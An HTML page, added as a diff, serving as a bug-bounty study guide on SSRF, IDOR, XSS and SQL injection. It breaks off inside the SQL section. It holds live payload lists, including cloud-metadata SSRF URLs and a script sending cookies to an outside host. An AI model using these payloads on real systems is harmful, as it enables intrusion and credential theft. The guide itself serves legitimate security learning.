@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty + VAPT Bible — Rahul Masal</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: #0a0e1a;
+    color: #c9d1d9;
+    line-height: 1.7;
+    font-size: 15px;
+  }
+  .hero {
+    background: linear-gradient(135deg, #0d1117 0%, #0a0e1a 40%, #0d1f3c 100%);
+    border-bottom: 1px solid #21c55d44;
+    padding: 3rem 2rem 2rem;
+    text-align: center;
+  }
+  .hero h1 {
+    font-size: 2.4rem;
+    font-weight: 700;
+    color: #21c55d;
+    text-shadow: 0 0 30px #21c55d55;
+    letter-spacing: 1px;
+  }
+  .hero p {
+    color: #8b949e;
+    margin-top: 0.5rem;
+    font-size: 0.95rem;
+  }
+  .badge {
+    display: inline-block;
+    background: #21c55d22;
+    border: 1px solid #21c55d55;
+    color: #21c55d;
+    border-radius: 20px;
+    padding: 4px 14px;
+    font-size: 0.8rem;
+    margin: 4px;
+  }
+
+  nav {
+    background: #0d1117;
+    border-bottom: 1px solid #21262d;
+    padding: 0.8rem 2rem;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+  }
+  nav a {
+    color: #8b949e;
+    text-decoration: none;
+    font-size: 0.8rem;
+    padding: 4px 10px;
+    border-radius: 6px;
+    border: 1px solid #21262d;
+    transition: all 0.2s;
+  }
+  nav a:hover { background: #21c55d22; color: #21c55d; border-color: #21c55d55; }
+
+  .container { max-width: 960px; margin: 0 auto; padding: 2rem; }
+
+  .section {
+    margin: 3rem 0;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    overflow: hidden;
+    background: #0d1117;
+  }
+  .section-header {
+    background: linear-gradient(90deg, #0d1f3c, #0d1117);
+    border-bottom: 1px solid #21c55d44;
+    padding: 1.2rem 1.5rem;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .section-header .icon { font-size: 1.5rem; }
+  .section-header h2 {
+    font-size: 1.3rem;
+    font-weight: 600;
+    color: #e6edf3;
+  }
+  .section-header .vuln-tag {
+    margin-left: auto;
+    background: #21c55d22;
+    border: 1px solid #21c55d44;
+    color: #21c55d;
+    border-radius: 6px;
+    padding: 3px 10px;
+    font-size: 0.75rem;
+    font-weight: 600;
+  }
+  .section-header .vuln-tag.high { background: #f8514922; border-color: #f8514944; color: #f85149; }
+  .section-header .vuln-tag.critical { background: #ff000022; border-color: #ff000044; color: #ff6b6b; }
+  .section-header .vuln-tag.medium { background: #e3b34122; border-color: #e3b34144; color: #e3b341; }
+
+  .section-body { padding: 1.5rem; }
+
+  .block {
+    margin: 1.2rem 0;
+    padding: 1rem 1.2rem;
+    border-radius: 8px;
+    border-left: 3px solid;
+  }
+  .block.definition { background: #1c2333; border-color: #58a6ff; }
+  .block.theory { background: #1c2333; border-color: #e3b341; }
+  .block.scenario { background: #1c2333; border-color: #21c55d; }
+  .block.steps { background: #1c2333; border-color: #a78bfa; }
+  .block.payload { background: #161b22; border-color: #f85149; font-family: monospace; }
+  .block.tools { background: #1c2333; border-color: #38bdf8; }
+  .block.bypass { background: #1c2333; border-color: #fb923c; }
+  .block.impact { background: #1c2333; border-color: #f85149; }
+  .block.chain { background: #1c2333; border-color: #c084fc; }
+  .block.interview { background: #0d2016; border-color: #21c55d; border-left-width: 4px; }
+  .block.revision { background: #1a1000; border-color: #e3b341; border-left-width: 4px; }
+
+  .block-title {
+    font-size: 0.75rem;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin-bottom: 0.6rem;
+    opacity: 0.7;
+  }
+  .block.definition .block-title { color: #58a6ff; }
+  .block.theory .block-title { color: #e3b341; }
+  .block.scenario .block-title { color: #21c55d; }
+  .block.steps .block-title { color: #a78bfa; }
+  .block.payload .block-title { color: #f85149; }
+  .block.tools .block-title { color: #38bdf8; }
+  .block.bypass .block-title { color: #fb923c; }
+  .block.impact .block-title { color: #f85149; }
+  .block.chain .block-title { color: #c084fc; }
+  .block.interview .block-title { color: #21c55d; }
+  .block.revision .block-title { color: #e3b341; }
+
+  .block p, .block li { color: #c9d1d9; margin: 4px 0; }
+  .block ul, .block ol { padding-left: 1.4rem; }
+  .block li { margin: 6px 0; }
+
+  code {
+    background: #161b22;
+    color: #79c0ff;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.88rem;
+  }
+  pre {
+    background: #161b22;
+    color: #79c0ff;
+    padding: 1rem;
+    border-radius: 8px;
+    overflow-x: auto;
+    font-size: 0.85rem;
+    line-height: 1.6;
+    border: 1px solid #21262d;
+    margin: 8px 0;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  pre .comment { color: #6e7681; }
+  pre .keyword { color: #f85149; }
+  pre .string { color: #a5d6ff; }
+
+  .highlight { color: #21c55d; font-weight: 600; }
+  .danger { color: #f85149; }
+  .warn { color: #e3b341; }
+  .info { color: #58a6ff; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid #21262d;
+    margin: 1rem 0;
+  }
+
+  .toc {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 1.5rem;
+    margin: 2rem 0;
+  }
+  .toc h3 { color: #e6edf3; margin-bottom: 1rem; font-size: 1rem; }
+  .toc-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 8px;
+  }
+  .toc-item {
+    background: #161b22;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 8px 12px;
+    font-size: 0.85rem;
+    color: #8b949e;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .toc-item:hover { background: #21c55d11; color: #21c55d; }
+  .num {
+    background: #21c55d22;
+    color: #21c55d;
+    border-radius: 4px;
+    padding: 1px 7px;
+    font-size: 0.75rem;
+    font-weight: 700;
+  }
+
+  .quick-ref {
+    background: linear-gradient(135deg, #0d1117, #0d1f3c);
+    border: 2px solid #21c55d44;
+    border-radius: 12px;
+    padding: 2rem;
+    margin: 3rem 0;
+  }
+  .quick-ref h2 {
+    color: #21c55d;
+    margin-bottom: 1.5rem;
+    font-size: 1.4rem;
+    text-align: center;
+  }
+  .quick-ref-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 1rem;
+  }
+  .quick-card {
+    background: #161b22;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 1rem;
+  }
+  .quick-card h4 {
+    color: #21c55d;
+    font-size: 0.9rem;
+    margin-bottom: 8px;
+    font-weight: 600;
+  }
+  .quick-card ol {
+    padding-left: 1.2rem;
+    font-size: 0.82rem;
+    color: #8b949e;
+  }
+  .quick-card ol li { margin: 4px 0; }
+
+  footer {
+    text-align: center;
+    padding: 2rem;
+    color: #21262d;
+    border-top: 1px solid #21262d;
+    font-size: 0.85rem;
+    color: #6e7681;
+  }
+
+  @media (max-width: 600px) {
+    .hero h1 { font-size: 1.6rem; }
+    nav { gap: 4px; }
+    .container { padding: 1rem; }
+    .quick-ref-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <h1>&#x1F9EA; Bug Bounty + VAPT Bible</h1>
+  <p>Built for Rahul Masal — VAPT Specialist &amp; Bug Bounty Hunter</p>
+  <div style="margin-top: 1rem;">
+    <span class="badge">From All Major Books</span>
+    <span class="badge">1000+ H1 Reports</span>
+    <span class="badge">Interview Ready</span>
+    <span class="badge">Real Payloads</span>
+    <span class="badge">Chain Mindset</span>
+  </div>
+</div>
+
+<nav>
+  <a href="#ssrf">SSRF</a>
+  <a href="#idor">IDOR</a>
+  <a href="#xss">XSS</a>
+  <a href="#sqli">SQLi</a>
+  <a href="#csrf">CSRF</a>
+  <a href="#open-redirect">Open Redirect</a>
+  <a href="#file-upload">File Upload</a>
+  <a href="#auth">Auth Bugs</a>
+  <a href="#password-reset">Password Reset</a>
+  <a href="#jwt">JWT</a>
+  <a href="#race">Race Condition</a>
+  <a href="#biz-logic">Business Logic</a>
+  <a href="#api">API Bugs</a>
+  <a href="#recon">Recon</a>
+  <a href="#quick">Quick Revision</a>
+</nav>
+
+<div class="container">
+
+  <!-- TABLE OF CONTENTS -->
+  <div class="toc">
+    <h3>&#x1F4CB; What's Inside</h3>
+    <div class="toc-grid">
+      <div class="toc-item"><span class="num">01</span> SSRF (Deep Dive)</div>
+      <div class="toc-item"><span class="num">02</span> IDOR / BOLA</div>
+      <div class="toc-item"><span class="num">03</span> XSS (All Types)</div>
+      <div class="toc-item"><span class="num">04</span> SQL Injection</div>
+      <div class="toc-item"><span class="num">05</span> CSRF</div>
+      <div class="toc-item"><span class="num">06</span> Open Redirect</div>
+      <div class="toc-item"><span class="num">07</span> File Upload</div>
+      <div class="toc-item"><span class="num">08</span> Auth Flaws</div>
+      <div class="toc-item"><span class="num">09</span> Password Reset</div>
+      <div class="toc-item"><span class="num">10</span> JWT Attacks</div>
+      <div class="toc-item"><span class="num">11</span> Race Conditions</div>
+      <div class="toc-item"><span class="num">12</span> Business Logic</div>
+      <div class="toc-item"><span class="num">13</span> API Vulnerabilities</div>
+      <div class="toc-item"><span class="num">14</span> Recon Bible</div>
+      <div class="toc-item"><span class="num">&#x26A1;</span> L100 Quick Revision</div>
+    </div>
+  </div>
+
+  <!-- ==================== 01. SSRF ==================== -->
+  <div class="section" id="ssrf">
+    <div class="section-header">
+      <span class="icon">&#x1F310;</span>
+      <h2>01. Server-Side Request Forgery (SSRF)</h2>
+      <span class="vuln-tag critical">CRITICAL</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition — Say This In Interview</div>
+        <p>SSRF is when an attacker tricks the <span class="highlight">server</span> into making HTTP requests to places the attacker cannot reach directly. The server becomes your proxy to reach internal systems, cloud metadata, or other backend services.</p>
+        <p style="margin-top: 8px;"><em>"Instead of me making a request to the internal database, I make the server do it for me."</em></p>
+      </div>
+
+      <div class="block theory">
+        <div class="block-title">Why This Happens — Root Cause</div>
+        <ul>
+          <li>Application takes a user-supplied URL and fetches it server-side without validating where it points.</li>
+          <li>Features like: image upload by URL, PDF generator, webhook config, RSS feed import, integrations that fetch remote data — all are dangerous here.</li>
+          <li>The server sits INSIDE the network with internal trust. Firewalls only block external → internal traffic, not internal → internal. So when server makes a request to <code>169.254.169.254</code>, the firewall has no say.</li>
+          <li>Root cause = missing allow-list of destinations, or weak block-list that attackers bypass.</li>
+        </ul>
+      </div>
+
+      <div class="block scenario">
+        <div class="block-title">Real-Life Scenario (SaaS / Cloud)</div>
+        <p><strong>Capital One AWS Breach (2019):</strong></p>
+        <ul>
+          <li>App had a WAF running on an EC2 instance with an IAM role attached.</li>
+          <li>Attacker found SSRF in the WAF config endpoint.</li>
+          <li>Used SSRF to hit: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+          <li>Got AWS access keys. Listed S3 buckets. Downloaded 100M customer records.</li>
+          <li>Full cloud account takeover from one SSRF bug.</li>
+        </ul>
+        <p style="margin-top: 8px;"><strong>Yahoo Mail → RCE ($15,000):</strong></p>
+        <ul>
+          <li>Found <code>/logoGrabber?url=</code> endpoint that fetched any URL.</li>
+          <li>Used open redirect to bypass gopher:// filter.</li>
+          <li>Port scanned internally via timing. Found Redis on port 6379.</li>
+          <li>Used Gopherus to send Redis payload via SSRF. Got reverse shell as root.</li>
+        </ul>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find — Step By Step</div>
+        <ol>
+          <li>Look for parameters: <code>url=</code>, <code>uri=</code>, <code>link=</code>, <code>dest=</code>, <code>redirect=</code>, <code>image=</code>, <code>feed=</code>, <code>target=</code>, <code>src=</code>, <code>path=</code></li>
+          <li>Look for features: PDF generators, image import by URL, webhooks, RSS/Atom feed readers, file import, "connect to external service" flows</li>
+          <li>Start with Interactsh or Burp Collaborator URL in the param. If you get a DNS/HTTP ping back = SSRF confirmed (blind).</li>
+          <li>Try internal targets: <code>http://127.0.0.1</code>, <code>http://localhost</code>, <code>http://169.254.169.254</code></li>
+          <li>For cloud: try AWS metadata, GCP metadata, Azure metadata endpoints</li>
+          <li>If direct is blocked, try bypasses (see below)</li>
+          <li>Use SSRFmap or Gopherus for exploitation</li>
+        </ol>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads — Real World</div>
+<pre><span class="comment"># Basic internal access</span>
+http://127.0.0.1/admin
+http://localhost:8080/
+http://0.0.0.0/
+http://[::1]/
+
+<span class="comment"># AWS Metadata (IMDSv1)</span>
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+<span class="comment"># GCP Metadata</span>
+http://metadata.google.internal/computeMetadata/v1/
+<span class="comment"># Needs header: Metadata-Flavor: Google</span>
+
+<span class="comment"># Azure Metadata</span>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+<span class="comment"># Needs header: Metadata: true</span>
+
+<span class="comment"># Encoded bypasses for 127.0.0.1</span>
+http://2130706433/          <span class="comment"># decimal</span>
+http://0x7f000001/          <span class="comment"># hex</span>
+http://017700000001/        <span class="comment"># octal</span>
+http://127.1/               <span class="comment"># short notation</span>
+http://127.0.0.1.nip.io/   <span class="comment"># DNS resolves to 127.0.0.1</span>
+
+<span class="comment"># Protocol bypasses</span>
+gopher://127.0.0.1:6379/_PING%0D%0A   <span class="comment"># Redis via SSRF</span>
+file:///etc/passwd
+dict://127.0.0.1:11211/
+
+<span class="comment"># Open redirect chain</span>
+https://allowed.com/redirect?url=http://169.254.169.254/
+
+<span class="comment"># URL parser differentials (Orange Tsai tricks)</span>
+http://127.0.0.1@evil.com/
+http://evil.com#@127.0.0.1/
+http://evil.com?.127.0.0.1/</pre>
+      </div>
+
+      <div class="block tools">
+        <div class="block-title">Tools</div>
+        <ul>
+          <li><strong>Interactsh</strong> — for catching blind SSRF OOB callbacks (DNS/HTTP)</li>
+          <li><strong>Burp Collaborator</strong> — same purpose, comes with Burp Pro</li>
+          <li><strong>Collaborator Everywhere</strong> — Burp extension that auto-injects collab payloads in all params</li>
+          <li><strong>SSRFmap</strong> — automates SSRF exploitation (port scan, Redis, AWS, FastCGI modules)</li>
+          <li><strong>Gopherus</strong> — generates gopher:// payloads for Redis, MySQL, FastCGI exploitation</li>
+          <li><strong>Nuclei</strong> with SSRF templates — automated scanning at scale</li>
+        </ul>
+<pre><span class="comment"># SSRFmap usage</span>
+python3 ssrfmap.py -r request.txt -p url -m portscan,redis
+
+<span class="comment"># Gopherus for Redis</span>
+gopherus --exploit redis
+
+<span class="comment"># Automation at scale</span>
+assetfinder -subs-only target.com | httpx -silent | gau | grep "=" | qsreplace "http://YOUR.interactsh.com"</pre>
+      </div>
+
+      <div class="block bypass">
+        <div class="block-title">Bypass Techniques</div>
+        <ul>
+          <li><strong>IP encoding:</strong> decimal, hex, octal, short notation, IPv6 loopback</li>
+          <li><strong>DNS rebinding:</strong> register domain that first resolves to allowed IP, then switches to internal IP (low TTL)</li>
+          <li><strong>Custom DNS:</strong> point your domain A record to 127.0.0.1 — filter allows domain, server resolves to internal</li>
+          <li><strong>Open redirect chain:</strong> SSRF to allowed domain → redirect to blocked internal IP</li>
+          <li><strong>URL parser differential (@ trick):</strong> <code>http://allowed.com@127.0.0.1/</code> — filter sees allowed.com, cURL connects to 127.0.0.1</li>
+          <li><strong>Fragment trick:</strong> <code>http://127.0.0.1#.allowed.com</code></li>
+          <li><strong>Scheme switch via redirect:</strong> allow http → redirect to gopher:// (Yahoo case)</li>
+          <li><strong>CRLF injection:</strong> inject headers into SSRF request to satisfy metadata header requirements</li>
+          <li><strong>IPv6 for metadata bypass:</strong> some filters block 169.254.169.254 but not <code>http://[fe80::a9fe:a9fe]/</code></li>
+        </ul>
+      </div>
+
+      <div class="block impact">
+        <div class="block-title">Impact — How To Explain Severity</div>
+        <ul>
+          <li>Internal network scan — map entire backend infrastructure</li>
+          <li>Access cloud metadata → steal AWS/GCP/Azure credentials</li>
+          <li>Read internal config files, environment variables, secrets</li>
+          <li>Port scan internal services (Redis, MySQL, Elasticsearch)</li>
+          <li>Chain with gopher:// → Redis/MySQL RCE</li>
+          <li>Full cloud account takeover (Capital One level)</li>
+        </ul>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining — SSRF Leads To</div>
+        <ul>
+          <li>SSRF → AWS metadata → IAM keys → S3 data exfiltration → Full cloud takeover</li>
+          <li>SSRF + gopher + Redis → write SSH key → RCE</li>
+          <li>SSRF + gopher + FastCGI → PHP code execution → RCE</li>
+          <li>SSRF → internal Jenkins (no auth) → run build script → RCE</li>
+          <li>SSRF → internal admin panel (trusted from localhost) → auth bypass → account takeover</li>
+          <li>SSRF → Kubernetes API → list secrets → cluster compromise</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer — Say This In 3 Lines</div>
+        <p>"SSRF happens when an application takes user-supplied URLs and makes server-side requests to them without proper validation. The attacker uses the server as a proxy to reach internal systems — like cloud metadata services, internal admin panels, or backend databases — that are normally unreachable from outside. The most dangerous impact is stealing cloud IAM credentials via the metadata endpoint, which can lead to full cloud account compromise like the Capital One breach."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 02. IDOR ==================== -->
+  <div class="section" id="idor">
+    <div class="section-header">
+      <span class="icon">&#x1F511;</span>
+      <h2>02. IDOR / BOLA — Insecure Direct Object Reference</h2>
+      <span class="vuln-tag high">HIGH</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition — Say This In Interview</div>
+        <p>IDOR happens when an application uses user-controllable identifiers (like IDs in URLs or request bodies) to access objects, but <span class="highlight">does not verify whether the logged-in user is actually authorized to access that specific object</span>.</p>
+        <p style="margin-top: 8px;"><em>"I can view User A's order just by changing the order ID from my order to theirs."</em></p>
+      </div>
+
+      <div class="block theory">
+        <div class="block-title">Why This Happens — Root Cause</div>
+        <ul>
+          <li>Developer checks authentication (are you logged in?) but not authorization (is this object yours?).</li>
+          <li>Objects are referenced by predictable identifiers: sequential integers, UUIDs, email IDs, filenames.</li>
+          <li>BOLA (Broken Object Level Authorization) is the same bug — OWASP API Security calls it that for API contexts.</li>
+          <li>Missing ownership check in the backend query: <code>SELECT * FROM orders WHERE id=?</code> — no <code>AND user_id = current_user</code></li>
+        </ul>
+      </div>
+
+      <div class="block scenario">
+        <div class="block-title">Real-Life Scenario</div>
+        <p><strong>InDrive (H1 report):</strong> Rider could accept passenger's order forcefully via IDOR on the order acceptance endpoint. Just changing the order_id in the request body revealed other users' PII.</p>
+        <p style="margin-top: 8px;"><strong>PayPal:</strong> IDOR to add secondary users to business accounts — just changing the account UUID allowed adding yourself as manager to any business account.</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find — Step By Step</div>
+        <ol>
+          <li>Create 2 accounts (Account A and Account B). This is mandatory.</li>
+          <li>With Account A, create an object (order, profile, file, ticket).</li>
+          <li>Note the ID in the request/URL.</li>
+          <li>Log in as Account B, and try to access Account A's object ID.</li>
+          <li>Also test: change UUID → sequential number, change numeric ID → another user's ID</li>
+          <li>Check ALL methods: GET, POST, PUT, DELETE, PATCH</li>
+          <li>Check indirect IDOR: filters, exports, search results — do they leak other users' data?</li>
+          <li>Check hidden IDs in JSON responses. Use those IDs in other endpoints.</li>
+          <li>Look for IDs in: URL path, query params, request body (JSON/form), headers like <code>X-User-ID</code></li>
+        </ol>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads / Test Cases</div>
+<pre><span class="comment"># URL path manipulation</span>
+GET /api/orders/1337 → change to /api/orders/1338
+
+<span class="comment"># JSON body manipulation</span>
+{"user_id": "1337"} → change to {"user_id": "1338"}
+
+<span class="comment"># Mass assignment IDOR</span>
+POST /profile/update
+{"email": "me@me.com", "role": "admin"}  <span class="comment"># try adding unexpected fields</span>
+
+<span class="comment"># UUID IDOR (still exploitable)</span>
+GET /api/v2/users/550e8400-e29b-41d4-a716-446655440000
+
+<span class="comment"># Endpoint variations to test</span>
+/api/users/{id}/profile
+/api/users/{id}/messages
+/api/users/{id}/orders
+/api/admin/users/{id}
+/export?user_id={id}
+/download?file_id={id}</pre>
+      </div>
+
+      <div class="block bypass">
+        <div class="block-title">Bypass Techniques</div>
+        <ul>
+          <li>Server validates GET but not POST — try changing method</li>
+          <li>Add <code>X-Original-URL: /admin/users/1</code> header bypass</li>
+          <li>API v1 might check auth, API v2 might not — test old versions</li>
+          <li>Try negative IDs: <code>-1</code>, <code>0</code></li>
+          <li>Try parameter pollution: <code>?id=1337&amp;id=1338</code></li>
+          <li>Try IDs in JSON as string vs integer: <code>"id": "1337"</code> vs <code>"id": 1337</code></li>
+          <li>Check GraphQL resolvers — they often miss auth checks on individual fields</li>
+        </ul>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining</div>
+        <ul>
+          <li>IDOR on password reset token → Account Takeover</li>
+          <li>IDOR on email change → change victim's email → ATO</li>
+          <li>IDOR on admin function (delete user, ban user) → privilege abuse</li>
+          <li>IDOR + information disclosure → leak PII → use in phishing → social engineering</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"IDOR occurs when an application uses user-controlled input to directly access database objects without checking if the current user owns or has permission to access that object. It is an authorization flaw — not authentication. You find it by creating two accounts and swapping object IDs between them. The impact ranges from data exposure to full account takeover if the IDOR is on sensitive operations like password reset or email change."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 03. XSS ==================== -->
+  <div class="section" id="xss">
+    <div class="section-header">
+      <span class="icon">&#x1F4A5;</span>
+      <h2>03. Cross-Site Scripting (XSS)</h2>
+      <span class="vuln-tag high">HIGH</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>XSS happens when an attacker injects malicious JavaScript into a web page that gets executed in another user's browser. The browser trusts scripts from the same origin, so injected script runs with full page privileges.</p>
+        <p style="margin-top: 8px;"><strong>3 types you must know:</strong></p>
+        <ul>
+          <li><strong>Reflected XSS:</strong> payload in URL → server reflects it in response → victim clicks crafted link</li>
+          <li><strong>Stored XSS:</strong> payload saved to database → loads for every visitor → most dangerous</li>
+          <li><strong>DOM XSS:</strong> payload processed in client-side JavaScript → never touches server → harder to detect</li>
+        </ul>
+      </div>
+
+      <div class="block theory">
+        <div class="block-title">Why This Happens — Root Cause</div>
+        <ul>
+          <li>User input is inserted into HTML/JS without proper encoding or sanitization.</li>
+          <li>Reflected: server echoes input back into the page without escaping HTML special chars.</li>
+          <li>Stored: app stores raw user input in DB, retrieves and renders it without encoding.</li>
+          <li>DOM: JavaScript reads from unsafe sources (<code>location.hash</code>, <code>document.URL</code>, <code>innerHTML</code>) and writes to sinks without sanitizing.</li>
+          <li>Key sinks: <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout()</code> with string args, <code>location.href</code></li>
+        </ul>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find</div>
+        <ol>
+          <li>Identify reflection points — put <code>rahultest123</code> in every input, search for it in the response.</li>
+          <li>Check what HTML context your input lands in: inside a tag, attribute, script block, or URL.</li>
+          <li>Based on context, craft your payload to break out and execute JS.</li>
+          <li>For DOM XSS: check JavaScript files for dangerous sinks reading from user-controlled sources.</li>
+          <li>Use Burp to intercept every request, look for your input reflected in the response.</li>
+          <li>For automated scan: use Dalfox, kxss, or BXSS for blind XSS.</li>
+        </ol>
+<pre><span class="comment"># Automated at scale</span>
+echo https://target.com | waybackurls | grep "=" | gf xss | dalfox pipe --silence
+
+<span class="comment"># Finding DOM XSS sources in JS</span>
+<span class="comment"># Look for: location.href, location.hash, document.URL, document.referrer</span>
+<span class="comment"># being passed to: innerHTML, document.write, eval, location, href</span></pre>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads — Context Based</div>
+<pre><span class="comment"># Basic (plain HTML context)</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="comment"># Attribute context (inside a tag attribute)</span>
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+
+<span class="comment"># URL context (href/src)</span>
+javascript:alert(1)
+%09Jav%09ascript:alert(1)
+javascript://%0Aalert(1)
+
+<span class="comment"># Filter bypass payloads</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;img src=x onerror=alert`1`&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;details/open/ontoggle=alert(1)&gt;
+&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,1&lt;/script&gt;
+
+<span class="comment"># Open redirect → XSS</span>
+javascript:alert(document.domain)
+
+<span class="comment"># Cookie stealing payload</span>
+&lt;script&gt;
+  fetch('https://your.interactsh.com/?c='+document.cookie)
+&lt;/script&gt;</pre>
+      </div>
+
+      <div class="block bypass">
+        <div class="block-title">Bypass Techniques</div>
+        <ul>
+          <li>Case variation: <code>&lt;ScRiPt&gt;</code></li>
+          <li>Self-closing tags: <code>&lt;img/src=x/onerror=alert(1)&gt;</code></li>
+          <li>Event handler alternatives: <code>onpointerenter</code>, <code>ontoggle</code>, <code>onbeforescriptexecute</code></li>
+          <li>HTML entities: <code>&amp;lt;script&amp;gt;</code> decoded in certain contexts</li>
+          <li>Double encoding: <code>%253Cscript%253E</code></li>
+          <li>Template literals for backtick based XSS: <code>alert`1`</code> (bypasses parenthesis filter)</li>
+          <li>Protocol-less: <code>//evil.com/xss.js</code></li>
+          <li>Using <code>import()</code> for module loading in modern CSP bypass</li>
+        </ul>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining</div>
+        <ul>
+          <li>Stored XSS → steal admin cookies → admin account takeover</li>
+          <li>Stored XSS + CSRF → perform actions as victim</li>
+          <li>XSS → keylogger on login form → credential theft</li>
+          <li>XSS + open redirect → phishing page</li>
+          <li>Self-XSS + CSRF → turn self-XSS into exploitable stored XSS</li>
+          <li>XSS in electron app → RCE (many electron apps had this)</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"XSS is when attacker-controlled JavaScript executes in another user's browser because the application outputs user input without proper HTML encoding. Reflected XSS needs a victim to click a crafted link; stored XSS persists in the database and affects all visitors; DOM XSS happens entirely client-side when JavaScript reads from untrustworthy sources like the URL and writes to dangerous sinks like innerHTML. The most impactful exploitation is stealing session cookies or performing actions as the victim user."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 04. SQL INJECTION ==================== -->
+  <div class="section" id="sqli">
+    <div class="section-header">
+      <span class="icon">&#x1F5C4;&#xFE0F;</span>
+      <h2>04. SQL Injection</h2>
+      <span class="vuln-tag critical">CRITICAL</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>SQL injection happens when user input is inserted directly into a SQL query without sanitization. The attacker injects SQL syntax that changes the query's logic — allowing them to read, modify, or delete database data, or even execute OS commands.</p>
+      </div>
+
+      <div class="block theory">
+        <div class="block-title">Why This Happens</div>
+        <ul>
+          <li>Developer builds SQL query by concatenating strings: <code>"SELECT * FROM users WHERE id=" + userInput</code></li>
+          <li>Input <code>1 OR 1=1</code> makes query: <code>SELECT * FROM users WHERE id=1 OR 1=1</code> — returns ALL users.</li>
+          <li>Fix is parameterized queries / prepared statements — keeps data and code separate.</li>
+          <li><strong>4 types:</strong> In-band (error-based, union-based), Blind (boolean, time-based), Out-of-band (DNS exfil)</li>
+        </ul>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find</div>
+        <ol>
+          <li>Test every input parameter with: <code>'</code>, <code>"</code>, <code>)</code>, <code>;</code></li>
+          <li>Look for database errors in response — reveals injection point</li>
+          <li>For blind: use boolean logic — <code>AND 1=1</code> (true) vs <code>AND 1=2</code> (false) — different responses?</li>
+          <li>For time-based blind: <code>AND SLEEP(5)</code> — does page hang for 5 seconds?</li>
+          <li>Check ALL input vectors: URL params, POST body, JSON fields, HTTP headers (<code>User-Agent</code>, <code>X-Forwarded-For</code>, <code>Cookie</code>)</li>
+          <li>Use sqlmap for confirmation and exploitation</li>
+        </ol>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads</div>
+<pre><span class="comment"># Detection</span>
+'
+"
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+') OR 1=1--
+
+<span class="comment"># Error-based (Oracle)</span>
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+
+<span class="comment"># Union-based (find columns first)</span>
+' ORDER BY 1--
+' ORDER BY 5--   <span class="comment"># keep until error</span>
+' UNION SELECT null,null,null--  <span class="comment"># match column count</span>
+' UNION SELECT username,password,null FROM users--
+
+<span class="comment"># Boolean blind</span>
+' AND SUBSTRING(username,1,1)='a'--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+<span class="comment"># Time-based blind</span>
+'; IF(1=1) WAITFOR DELAY '0:0:5'--   <span class="comment"># MSSQL</span>
+' AND SLEEP(5)--                      <span class="comment"># MySQL</span>
+'; SELECT pg_sleep(5)--              <span class="comment"># PostgreSQL</span>
+
